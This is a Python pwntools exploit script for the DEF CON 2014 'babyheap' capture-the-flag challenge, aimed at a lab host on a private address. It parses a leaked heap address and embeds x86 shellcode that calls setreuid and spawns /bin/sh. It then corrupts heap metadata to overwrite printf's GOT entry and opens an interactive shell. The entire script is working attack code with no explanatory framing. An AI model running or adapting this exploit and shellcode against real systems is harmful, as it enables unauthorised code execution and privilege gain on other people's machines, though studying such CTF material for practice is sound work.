from pwn import *
import re
def main():
	"""
		defcon-2014-babyheap
	"""
	HOST = "192.168.56.101"
	PORT = 49158
	conn = remote(HOST,PORT)
	data = conn.recvuntil("Write to object [size=260]:")
	raw_input("$")

	#Get Heap pointer to shellcode
	my_loc = re.findall("\[ALLOC\]\[loc=(.*)\]\[size=260\]",data)
	my_ptr = int(my_loc[0],16)
	print ("HEAP ADR:%s"%hex(my_ptr))

	#setreuid /bin/sh
	shellcode_length = 252
	shellcode = "\xeb\x0c"
	shellcode = shellcode + "\x90"*40 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
	shellcode = shellcode + "\x90"*(shellcode_length-len(shellcode))
	
	#printf .got pointer	
	pf_ptr = struct.pack("<L",0x804c004-8)	

	#heap pointer to shellcode
	mp_8 = struct.pack("<L",my_ptr+8)
	conn.sendline(pf_ptr+mp_8+shellcode+"\xf8\xff\xff\xff"+"\xfb\xff\xff\xff")
	conn.interactive()
	pass
main()
